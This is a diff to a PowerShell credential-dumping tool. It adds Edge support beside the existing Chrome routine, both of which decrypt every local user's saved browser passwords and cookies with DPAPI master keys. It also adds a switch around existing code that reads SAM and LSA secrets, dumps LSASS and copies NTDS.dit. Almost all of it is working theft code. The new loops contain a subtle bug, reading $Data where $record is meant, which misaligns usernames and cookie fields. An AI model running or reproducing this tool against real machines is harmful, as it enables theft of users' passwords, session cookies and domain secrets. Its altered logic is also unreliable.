@@ -4856,14 +4856,14 @@ function Get-CredentialVaultManager($MasterKeys, $InUserContext, $NoMasterKeysDe
 	#>
 }
 
-function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
+function Get-ChromeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
-		Get-ChromePwds: Chrome Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them
+		Get-ChromeSecrets: Chrome Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them
 			- We need their Pwd/NT Hash -> User PreKeys -> User MasterKeys
 			- Or a session running as the user that own the Chrome secret
 			1- Found encrypted datas, many potential paths
-				- C:\Users\<User>\[Local/Roaming/LocalLow]\[""/Google]\Chome\User Data\[""/Default]\[Local State/Login Data/Cookies]
+				- C:\Users\<User>\AppData\[Local/Roaming/LocalLow]\[""/Google]\Chome\User Data\[""/Default]\[Local State/Login Data/Cookies]
 				- "Local State" is a file that contain a key encrypted with DPAPI
 				- "Login Data" is a SQLite file that contain passwords (= password_value) encrypted (action_url, username_value, password_value FROM logins)
 				- "Cookies" is a SQLite file that contain cookies (= encrypted_value) encrypted (host_key, name, path, encrypted_value FROM cookies)
@@ -4895,7 +4895,6 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 					$FileLocalState =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Local State"
 					If (Test-Path $FileLocalState)
 					{
-
 						$Content = Get-Content $FileLocalState
 						$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
 						$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
@@ -4932,62 +4931,78 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 			If ($Results[$UserName]["FileLoginData"])
 			{
 				$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
-				$Data = [SqliteHelper]::Execute($DB, 'SELECT action_url, username_value FROM logins')
+				$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
 				$ClearValues["URLs"] = @()
-				foreach ($record in $Data) # Found that some time action_url may be empty
+				$ClearValues["Logins"] = @()
+				foreach ($record in $Data)
 				{
-					$actionUrl = $record.action_url
-				
-					# Check if action_url is empty, and provide a default string if it is
-					if (-not $actionUrl)
+					If ($record.signon_realm)
 					{
-						$actionUrl = "<EmptyURL>"
+						$ClearValues["URLs"] += $record.signon_realm
 					}
-				
-					# Add the action_url (either the original or the default) to the URLs array
-					$ClearValues["URLs"] += $actionUrl
+					ElseIf ($record.origin_url)
+					{
+						$ClearValues["URLs"] += $record.origin_url
+					}
+					Else
+					{
+						$ClearValues["URLs"] += "<EmptyURL>"
+					}
+					
+					$ClearValues["Logins"] += $Data.username_value
 				}
-				$ClearValues["Logins"] = $Data.username_value
 				
-				$EncPwds = [byte[]]@()
-				For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+				If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
 				{
-					$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
-					$EncPwd = $Data.password_value
-					If ($EncPwd) { $EncPwds += ,$EncPwd }
-					Else { Break }
+					$EncPwds = [byte[]]@()
+					For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+					{
+						$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
+						$EncPwd = $Data.password_value
+						If ($EncPwd) { $EncPwds += ,$EncPwd }
+						Else { Break }
+					}
+					$EncValues["Pwds"] = $EncPwds
 				}
-				$EncValues["Pwds"] = $EncPwds
 			}
 
 			If ($Results[$UserName]["FileCookies"])
 			{
 				$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
 				$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
-				$ClearValues["HostKeys"] = $Data.host_key
-				$ClearValues["Names"] = $Data.name
-				$ClearValues["Paths"] = $Data.path
-				
-				$EncCookies = [byte[]]@()
-				For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+				$ClearValues["HostKeys"] = @()
+				$ClearValues["Names"] = @()
+				$ClearValues["Paths"] = @()
+				foreach ($record in $Data)
 				{
-					$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
-					$EncCookie = $Data.encrypted_value
-					If ($EncCookie) { $EncCookies += ,$EncCookie }
-					Else { Break }
+					$ClearValues["HostKeys"] += $Data.host_key
+					$ClearValues["Names"] += $Data.name
+					$ClearValues["Paths"] += $Data.path
 				}
-				$EncValues["Cookies"] = $EncCookies
+				
+				If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
+				{
+					$EncCookies = [byte[]]@()
+					For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+					{
+						$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
+						$EncCookie = $Data.encrypted_value
+						If ($EncCookie) { $EncCookies += ,$EncCookie }
+						Else { Break }
+					}
+					$EncValues["Cookies"] = $EncCookies
+				}
 			}
 
 			ForEach ($TypeEncValues in $EncValues.Keys)
 			{
 				If ($TypeEncValues -eq "Pwds")
 				{
-					Write-Host("[+] Try to decrypt credentials for user {0}" -f ($UserName))
+					Write-Host("[+] Try to decrypt credentials for user '{0}'" -f ($UserName))
 				}
 				Else
 				{
-					Write-Host("[+] Try to decrypt cookies for user {0}" -f ($UserName))
+					Write-Host("[+] Try to decrypt cookies for user '{0}'" -f ($UserName))
 				}
 
 				For ($i = 0; $i -lt ($EncValues[$TypeEncValues]).Length; $i += 1)
@@ -5017,17 +5032,17 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 								Catch
 								{
 									Write-Host ("`t[-] Exception: {0}" -f ($_.Exception.Message))
-									Write-Host ("`t[-] AES256-GCM decryption of Chrome secret for user {0} failed" -f ($UserName))
+									Write-Host ("`t[-] AES256-GCM decryption of Chrome secret for user '{0}' failed" -f ($UserName))
 								}
 							}
 							Else
 							{
-								Write-Host ("`t[-] No MasterKey found to decrypt LocalState key for user {0}" -f ($UserName))
+								Write-Host ("`t[-] No MasterKey found to decrypt LocalState key for user '{0}'" -f ($UserName))
 							}
 						}
 						Else
 						{
-							Write-Host ("`t[-] No LocalState key found to decrypt Chrome secret for user {0}" -f ($UserName))
+							Write-Host ("`t[-] No LocalState key found to decrypt Chrome secret for user '{0}'" -f ($UserName))
 						}
 					}
 					# Chrome version < v80
@@ -5045,7 +5060,7 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 						}
 						Else
 						{
-							Write-Host ("`t[-] No MasterKey found to decrypt Chrome secret for user {0}" -f ($UserName))
+							Write-Host ("`t[-] No MasterKey found to decrypt Chrome secret for user '{0}'" -f ($UserName))
 						}
 					}
 				}
@@ -5057,17 +5072,235 @@ function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 	Write-Host ""
 }
 
+function Get-EdgeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
+{
+	<#
+		Get-EdgeSecrets: Edge Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them
+			- We need their Pwd/NT Hash -> User PreKeys -> User MasterKeys
+			- Or a session running as the user that own the Edge secret
+			1- Found encrypted datas, many potential paths
+				- C:\Users\<User>\AppData\[Local/Roaming/LocalLow]\Microsoft\Edge\User Data\[""/Default]\[""/Network]\[Local State/Login Data/Cookies]
+				- "Local State" is a file that contain a key encrypted with DPAPI
+				- "Login Data" is a SQLite file that contain passwords (= password_value) encrypted (action_url, username_value, password_value FROM logins)
+				- "Cookies" is a SQLite file that contain cookies (= encrypted_value) encrypted (host_key, name, path, encrypted_value FROM cookies)
+			2- Depending on Edge versions
+				2.1- Edge version < vXX ?
+					- Try to decrypt DPAPI Blob with Decrypt-DPAPIBlob and MasterKeys and get the secret Pwd/Cookie
+				2.2- Edge version >= vXX ?
+					- Try to decrypt Local State Key with Decrypt-DPAPIBlob and MasterKeys
+					- From password_value/encrypted_value extract Nonce, CipherText, Tag : "v10"|Nonce|CipherText|Tag
+					- Secret Pwd/Cookie = AES256-GCMDecrypt (SecretKey = LocalStateKey decrypted, IV = Nonce, AuthTag = Tag, AuthData = "", CipherText = CipherText)
+	#>
+	
+	Write-Host ("[===] Searching Edge pwds/cookies and decrypt them [===]")
+
+	LoadSQLite
+
+	$Results = @{}
+	ForEach ($Child in Get-ChildItem "C:\Users")
+	{
+		$UserDir = $Child.FullName
+		$UserName = $Child.Name
+		$User = @{}
+		ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
+		{
+			ForEach ($Subfolder2 in @("", "Default"))
+			{
+				ForEach ($Subfolder3 in @("", "Network"))
+				{
+					$FileLocalState =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Local State"
+					If (Test-Path $FileLocalState)
+					{
+						$Content = Get-Content $FileLocalState
+						$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
+						$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
+						$EncBlobB64_2 = $Content.IndexOf('"}')
+						$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
+						$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
+						$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
+					}
+
+					$FileLoginData = "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Login Data"
+					If (Test-Path $FileLoginData)
+					{
+						$User["FileLoginData"] = $FileLoginData
+					}
+
+					$FileCookies =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Cookies"
+					If (Test-Path $FileCookies)
+					{
+						$User["FileCookies"] = $FileCookies
+					}
+				}
+			}
+		}
+
+		If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+	}
+
+	If (($Results.Keys).Count -gt 0)
+	{
+		ForEach ($UserName in $Results.Keys)
+		{
+			$ClearValues = @{}
+			$EncValues = @{}
+			If ($Results[$UserName]["FileLoginData"])
+			{
+				$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
+				$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
+				$ClearValues["URLs"] = @()
+				$ClearValues["Logins"] = @()
+				foreach ($record in $Data)
+				{
+					If ($record.signon_realm)
+					{
+						$ClearValues["URLs"] += $record.signon_realm
+					}
+					ElseIf ($record.origin_url)
+					{
+						$ClearValues["URLs"] += $record.origin_url
+					}
+					Else
+					{
+						$ClearValues["URLs"] += "<EmptyURL>"
+					}
+					
+					$ClearValues["Logins"] += $Data.username_value
+				}
+				
+				If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
+				{
+					$EncPwds = [byte[]]@()
+					For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+					{
+						$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
+						$EncPwd = $Data.password_value
+						If ($EncPwd) { $EncPwds += ,$EncPwd }
+						Else { Break }
+					}
+					$EncValues["Pwds"] = $EncPwds
+				}
+			}
+
+			If ($Results[$UserName]["FileCookies"])
+			{
+				$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
+				$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
+				$ClearValues["HostKeys"] = @()
+				$ClearValues["Names"] = @()
+				$ClearValues["Paths"] = @()
+				foreach ($record in $Data)
+				{
+					$ClearValues["HostKeys"] += $Data.host_key
+					$ClearValues["Names"] += $Data.name
+					$ClearValues["Paths"] += $Data.path
+				}
+				
+				If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
+				{
+					$EncCookies = [byte[]]@()
+					For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+					{
+						$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
+						$EncCookie = $Data.encrypted_value
+						If ($EncCookie) { $EncCookies += ,$EncCookie }
+						Else { Break }
+					}
+					$EncValues["Cookies"] = $EncCookies
+				}
+			}
+
+			ForEach ($TypeEncValues in $EncValues.Keys)
+			{
+				If ($TypeEncValues -eq "Pwds")
+				{
+					Write-Host("[+] Try to decrypt credentials for user '{0}'" -f ($UserName))
+				}
+				Else
+				{
+					Write-Host("[+] Try to decrypt cookies for user '{0}'" -f ($UserName))
+				}
+
+				For ($i = 0; $i -lt ($EncValues[$TypeEncValues]).Length; $i += 1)
+				{
+					# Edge version >= vXX ?
+					If ([System.Text.Encoding]::ASCII.GetString($EncValues[$TypeEncValues][$i][0..2]) -eq "v10")
+					{
+						If ($Results[$UserName]["EncLocalState"])
+						{
+							$Results[$UserName]["LocalState"] = Decrypt-DPAPIBlob $Results[$UserName]["EncLocalState"] $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
+							If ($Results[$UserName]["LocalState"])
+							{
+								$Nonce = $EncValues[$TypeEncValues][$i][3..14]
+								$CipherText = $EncValues[$TypeEncValues][$i][15..$($EncValues[$TypeEncValues][$i].Length-1-16)]
+								$Tag = $EncValues[$TypeEncValues][$i][$($EncValues[$TypeEncValues][$i].Length-16)..$($EncValues[$TypeEncValues][$i].Length-1)]
+								LoadAESGCMDecrypt
+								Try
+								{
+									$ClearTextBytes = [BCryptInterop]::AESGCMDecrypt($Results[$UserName]["LocalState"], $Nonce, $Null, $CipherText, $Tag)
+									$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
+									Switch ($TypeEncValues)
+									{
+										"Pwds" { Write-Host ("`t[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+										"Cookies" { Write-Host ("`t[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+									}
+								}
+								Catch
+								{
+									Write-Host ("`t[-] Exception: {0}" -f ($_.Exception.Message))
+									Write-Host ("`t[-] AES256-GCM decryption of Edge secret for user '{0}' failed" -f ($UserName))
+								}
+							}
+							Else
+							{
+								Write-Host ("`t[-] No MasterKey found to decrypt LocalState key for user '{0}'" -f ($UserName))
+							}
+						}
+						Else
+						{
+							Write-Host ("`t[-] No LocalState key found to decrypt Edge secret for user '{0}'" -f ($UserName))
+						}
+					}
+					# Edge version < vXX ?
+					Else
+					{
+						$ClearTextBytes = Decrypt-DPAPIBlob $EncValues[$TypeEncValues] $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
+						If ($ClearTextBytes)
+						{
+							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
+							Switch ($TypeEncValues)
+							{
+								"Pwds" { Write-Host ("`t[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+								"Cookies" { Write-Host ("`t[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+							}
+						}
+						Else
+						{
+							Write-Host ("`t[-] No MasterKey found to decrypt Edge secret for user '{0}'" -f ($UserName))
+						}
+					}
+				}
+			}
+		}
+	}
+	Else { Write-Host "[+] No Edge secrets saved" }
+
+	Write-Host ""
+}
+
 function Get-DPAPISecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
 		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys or in the context of the user
 			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed (as long as MasterKeys was computed)
 			- Decrypting Chrome secrets (cookies/pwds) requires User Master Keys thus It can fail (If user password/NT hash not provided, unencrypted MasterKey not dumped from LSASS or current user not own the DPAPI Secret)
+			- Decrypting Edge secrets (cookies/pwds) requires User Master Keys thus It can fail (If user password/NT hash not provided, unencrypted MasterKey not dumped from LSASS or current user not own the DPAPI Secret)
 			- Decrypting VPOL Files with System and User MasterKeys or in the context of the user -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
 	#>
 
 	Get-WiFiPwds $MasterKeys $InUserContext $NoMasterKeysDecryption
-	Get-ChromePwds $MasterKeys $InUserContext $NoMasterKeysDecryption
+	Get-ChromeSecrets $MasterKeys $InUserContext $NoMasterKeysDecryption
+	Get-EdgeSecrets $MasterKeys $InUserContext $NoMasterKeysDecryption
 	Get-CredentialVaultManager $MasterKeys $InUserContext $NoMasterKeysDecryption
 }
 
@@ -12187,7 +12420,7 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI -ImportDomainBackupKey <HexStringDomainBackupKeyPVKFormat> -SkipNTDS
 .EXAMPLE
-	Get-WindowsSecrets -DPAPI -InUserContext [-NoMasterKeysDecryption]
+	Get-WindowsSecrets -DPAPI -InUserContext -NoMasterKeysDecryption -SkipLSA -SkipLSASS -SkipNTDS
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
 #>
@@ -12212,6 +12445,7 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][Switch]$NoMasterKeysDecryption,
 		[Parameter(Mandatory=$False)][String]$ImportDomainBackupKey,
 		
+		[Parameter(Mandatory=$False)][Switch]$SkipLSA,		
 		[Parameter(Mandatory=$False)][Switch]$SkipLSASS,
 		[Parameter(Mandatory=$False)][Switch]$SkipNTDS,
 		[Parameter(Mandatory=$False)][Switch]$ExportDomainBackupKey,
@@ -12357,31 +12591,34 @@ function Get-WindowsSecrets()
 	# DPAPI Secrets
 	If ($DPAPI)
 	{
-		# Try to get first (If not already done)
+		# Try to get first (If not already done and not asked to skip)
 		# 	- LSA Secrets (for DPAPI System PreKeys)
 		#	- LSASS (for unencrypted Masterkeys)
 		# 	- NTDS.dit (for Domain Backup Key)
 		# 	- Pwds/NT Hashes passed in parameters (to compute DPAPI User PreKeys)
-		If (-not $BootKey)
+		If (-not $SkipLSA)
 		{
-			$BootKey = Get-BootKey
-		}
-
-		If (-not $SecurityAccountManager)
-		{
-			$SecurityAccountManager = Get-SAM $BootKey
-		}
-
-		If (-not $LSASecrets)
-		{
-			$LSASecretKey = Get-LSASecretKey $BootKey
-			If ($LSASecretKey)
+			If (-not $BootKey)
 			{
-				$LSASecrets = Get-LSASecrets $LSASecretKey
+				$BootKey = Get-BootKey
 			}
-			Else
+
+			If (-not $SecurityAccountManager)
 			{
-				return
+				$SecurityAccountManager = Get-SAM $BootKey
+			}
+
+			If (-not $LSASecrets)
+			{
+				$LSASecretKey = Get-LSASecretKey $BootKey
+				If ($LSASecretKey)
+				{
+					$LSASecrets = Get-LSASecrets $LSASecretKey
+				}
+				Else
+				{
+					return
+				}
 			}
 		}
 
@@ -12390,7 +12627,7 @@ function Get-WindowsSecrets()
 			$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
 		}
 
-		If (-not $DomainBackupKey -and -not $SkipNTDS)
+		If (-not $DomainBackupKey -and -not $SkipLSA -and -not $SkipNTDS)
 		{
 			$Users, $DomainBackupKeys = Get-NTDS -Method "Shadow Copy" $BootKey $ExportDomainBackupKey
 			If ($DomainBackupKeys.Count -gt 0)
@@ -12506,10 +12743,13 @@ function Get-WindowsSecrets()
 			}
 		}
 
-		$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
-		If (-not $NoMasterKeysDecryption)
+		If (-not $SkipLSA)
 		{
-			$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SecurityAccountManager $Pwds $NTHs $MasterKeys $DomainBackupKey
+			$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
+			If (-not $NoMasterKeysDecryption)
+			{
+				$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SecurityAccountManager $Pwds $NTHs $MasterKeys $DomainBackupKey
+			}
 		}
 		Get-DPAPISecrets $MasterKeys $InUserContext $NoMasterKeysDecryption
 	}
